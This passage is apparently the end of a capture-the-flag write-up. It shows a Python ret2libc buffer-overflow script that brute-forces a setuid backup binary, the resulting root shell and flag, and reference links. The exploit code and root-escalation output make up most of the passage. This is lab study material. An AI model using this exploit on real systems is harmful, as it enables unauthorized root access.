exit_off = 0x0002e7b0                  # readelf -s /lib32/libc.so.6 | grep exit
system_addr = libc_base_addr + system_off
exit_addr = libc_base_addr + exit_off
binSh = libc_base_addr + 0x15900b      # strings -tx /lib32/libc.so.6 | grep "/bin"

buf = "A" * 512
buf += struct.pack('<I', system_addr)
buf += struct.pack('<I', exit_addr)
buf += struct.pack('<I', binSh)

i = 0

while True:
    i += 1
    print " >> BRUTE ATTEMPT: #%d" %i
    call = subprocess.call(["/usr/local/bin/backup", "p3", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", buf])
    if (not call):
        break
    else:
        print " >> Failed"


tom@node:/dev/shm$ python bof.py
  --- snip ---
   >> BRUTE ATTEMPT: #15
  --- snip ---
  # id
    uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
  # cat /root/root.txt
    1722e99ca5f353b362556a62bd5e6be0



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

MongoDB Insert Document:
  https://www.tutorialspoint.com/mongodb/mongodb_insert_document.htm
  https://www.bookstack.cn/read/mongodb-4.2-manual/c886d0f31f1fef7d.md

BOF 32 bit:
  https://bufferoverflows.net/rop-manual-exploitation-on-x32-linux/
